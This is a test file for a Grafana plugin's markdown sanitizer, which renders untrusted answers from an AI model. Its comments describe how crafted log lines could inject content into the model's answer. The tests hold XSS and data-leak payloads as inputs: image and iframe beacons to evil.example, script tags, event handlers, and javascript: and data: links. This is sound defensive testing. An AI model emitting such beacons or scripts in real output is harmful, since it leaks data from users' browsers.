import React from 'react';
import { render } from '@testing-library/react';
import { renderMarkdown } from '@grafana/data';
import { EXTERNAL_LINK_MARKER, ResponseMarkdown } from './ResponseMarkdown';

/**
 * Why layer 2 exists, as an executable claim rather than a line number in a PR body.
 *
 * This asserts the OBSERVABLE BEHAVIOUR of `renderMarkdown` — the justification for the
 * plugin's own allowlist — not Grafana's internals as a contract we depend on. We do not
 * care how `sanitizeTextPanelContent` is built, only that today it lets a remote embed
 * through, because that is precisely what our layer is here to stop.
 *
 * A FAILURE HERE IS GOOD NEWS, NOT A REGRESSION TO PATCH. It means Grafana tightened its
 * own allowlist and the premise of `sanitizeAnswerHtml` has changed. The correct response
 * is to re-evaluate whether layer 2 is still needed (and how much of it), not to loosen
 * this assertion until it passes again.
 */
describe('why layer 2 exists — renderMarkdown alone does not close B5', () => {
  test('Grafana markdown still emits a remote iframe and a remote img', () => {
    const iframe = renderMarkdown('<iframe src="https://evil.example/beacon?d=leak" width="1" height="1"></iframe>');
    expect(iframe).toContain('<iframe');
    expect(iframe).toContain('https://evil.example/beacon?d=leak');

    const img = renderMarkdown('<img src="https://evil.example/pixel.gif?e=leak">');
    expect(img).toContain('<img');
    expect(img).toContain('https://evil.example/pixel.gif?e=leak');

    const markdownImage = renderMarkdown('![alt](https://evil.example/md.gif)');
    expect(markdownImage).toContain('https://evil.example/md.gif');
  });

  test('Grafana markdown does close the script / on* / javascript: half', () => {
    // Recorded so the split is explicit: this is the part our layer does NOT have to carry,
    // and the part PR #13's original test covered.
    expect(renderMarkdown('<script>window.__pwned = 1;</script>')).not.toContain('<script');
    expect(renderMarkdown('<img src="x" onerror="window.__pwned = 2">')).not.toContain('onerror');
    expect(renderMarkdown('[x](javascript:window.__pwned=3)')).not.toMatch(/href="javascript:/i);
  });

  test('external links come out of Grafana markdown with no rel', () => {
    // B5 item 2: the platform does not add rel="noopener noreferrer"; we do.
    expect(renderMarkdown('<a href="https://evil.example" target="_blank">x</a>')).not.toContain('rel=');
  });
});

/**
 * The dot-ai answer is untrusted input (see the threat model in ResponseMarkdown.tsx):
 * cluster telemetry that anyone able to emit a log line can influence reaches the model's
 * prompt, so every payload below is something a crafted Loki line could realistically get
 * echoed into an answer.
 *
 * Each malicious case asserts the same four properties of the rendered subtree: nothing
 * executable, no event-handler attribute, nothing that fetches a remote URL, and no
 * executable URL scheme.
 */

const ATTACKER = 'https://evil.example';

/** Elements that either execute, fetch a remote URL, or pull remote CSS. */
const FORBIDDEN_ELEMENTS = [
  'script',
  'iframe',
  'object',
  'embed',
  'applet',
  'img',
  'picture',
  'source',
  'video',
  'audio',
  'track',
  'svg',
  'canvas',
  'style',
  'link',
  'meta',
  'form',
  'input',
  'button',
  'textarea',
  'select',
  'frame',
  'frameset',
  'template',
  'noscript',
].join(',');

const FORBIDDEN_ATTRS = ['style', 'class', 'id', 'src', 'srcset', 'background', 'formaction'];

/** The sanitized subtree only — the component's own wrapper div carries emotion's class. */
function renderAnswer(text: string): HTMLElement {
  const { container } = render(<ResponseMarkdown text={text} />);
  const root = container.firstElementChild;
  if (!(root instanceof HTMLElement)) {
    throw new Error('ResponseMarkdown rendered no element');
  }
  return root;
}

function assertInert(root: HTMLElement) {
  // 1. nothing executable / remote-fetching / remote-CSS
  expect(root.querySelectorAll(FORBIDDEN_ELEMENTS)).toHaveLength(0);

  for (const el of Array.from(root.querySelectorAll('*'))) {
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      // 2. no event handlers, and no styling/identity attributes the model could aim at
      expect(name.startsWith('on')).toBe(false);
      expect(FORBIDDEN_ATTRS).not.toContain(name);
      // 3. no remote fetch smuggled through any surviving attribute value
      expect(attr.value).not.toContain(ATTACKER);
      // 4. no executable URL scheme anywhere
      expect(attr.value).not.toMatch(/^\s*(?:javascript|data|vbscript):/i);
    }
  }

  expect((window as unknown as Record<string, unknown>).__pwned).toBeUndefined();
}

describe('ResponseMarkdown — benign control case', () => {
  test('renders headings, lists, tables, code and safe links', () => {
    const root = renderAnswer(
      [
        '## Top issues',
        '',
        '1. **CrashLoop** on `api`',
        '2. OOM on worker',
        '',
        '| pod | restarts |',
        '| --- | --- |',
        '| api | 12 |',
        '',
        '```yaml',
        'kind: Pod',
        '```',
        '',
        '[runbook](https://runbooks.example/crashloop)',
      ].join('\n')
    );

    expect(root.querySelector('h2')?.textContent).toMatch(/top issues/i);
    expect(root.querySelectorAll('ol > li')).toHaveLength(2);
    expect(root.querySelector('strong')?.textContent).toBe('CrashLoop');
    expect(root.querySelector('table th')?.textContent).toBe('pod');
    expect(root.querySelector('table td')?.textContent).toBe('api');
    expect(root.querySelector('pre code')?.textContent).toContain('kind: Pod');

    const link = root.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://runbooks.example/crashloop');
    // external → safe target semantics and visibly external, not a bare in-place link
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.textContent).toContain(EXTERNAL_LINK_MARKER.trim());
  });
});

describe('ResponseMarkdown — untrusted answer payloads', () => {
  test('raw <script> never becomes an element', () => {
    const root = renderAnswer('Findings\n\n<script>window.__pwned = 1;</script>\n\ndone');
    expect(root.querySelector('script')).toBeNull();
    expect(root.innerHTML).not.toContain('<script');
    assertInert(root);
  });

  test('remote <img> beacon is dropped, not rendered', () => {
    const root = renderAnswer(`Evidence\n\n<img src="${ATTACKER}/pixel.gif?e=leak">\n`);
    expect(root.querySelector('img')).toBeNull();
    assertInert(root);
  });

  test('markdown image syntax cannot fetch a remote URL either', () => {
    const root = renderAnswer(`![alt](${ATTACKER}/pixel.gif)`);
    expect(root.querySelector('img')).toBeNull();
    assertInert(root);
  });

  test('<iframe> embed is dropped', () => {
    const root = renderAnswer(`<iframe src="${ATTACKER}/beacon?d=leak" width="1" height="1"></iframe>`);
    expect(root.querySelector('iframe')).toBeNull();
    assertInert(root);
  });

  test('javascript: link is demoted to text', () => {
    const root = renderAnswer('[click me](javascript:window.__pwned=4)');
    expect(root.querySelector('a')).toBeNull();
    expect(root.textContent).toContain('click me');
    assertInert(root);
  });

  test('data:text/html link is demoted to text', () => {
    const root = renderAnswer(
      '[report](data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19wd25lZD01PC9zY3JpcHQ+)'
    );
    expect(root.querySelector('a')).toBeNull();
    expect(root.textContent).toContain('report');
    assertInert(root);
  });

  test('onerror / onclick handlers never survive on any element', () => {
    const root = renderAnswer(
      `<img src="x" onerror="window.__pwned = 2">\n\n` +
        `<div onclick="window.__pwned = 3">click</div>\n\n` +
        `<p onmouseover="window.__pwned = 6">hover</p>`
    );
    expect(root.textContent).toContain('click');
    expect(root.textContent).toContain('hover');
    assertInert(root);
  });

  test('style and class attributes are stripped (no UI redressing, no remote CSS)', () => {
    const root = renderAnswer(
      `<div style="position:fixed;width:100vw;height:100vh;background:url(${ATTACKER}/bg.png)">overlay</div>\n\n` +
        `<link rel="stylesheet" href="${ATTACKER}/x.css">\n\n` +
        `<p class="page-alert">styled</p>`
    );
    expect(root.querySelector('link')).toBeNull();
    expect(root.textContent).toContain('overlay');
    assertInert(root);
  });

  test('model-authored target=_blank link gets rel="noopener noreferrer"', () => {
    const root = renderAnswer(`<a href="${ATTACKER}/report" target="_blank">details</a>`);
    const link = root.querySelector('a');
    expect(link).not.toBeNull();
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link?.getAttribute('href')).toBe(`${ATTACKER}/report`);
    expect(link?.textContent).toContain(EXTERNAL_LINK_MARKER.trim());
  });
});
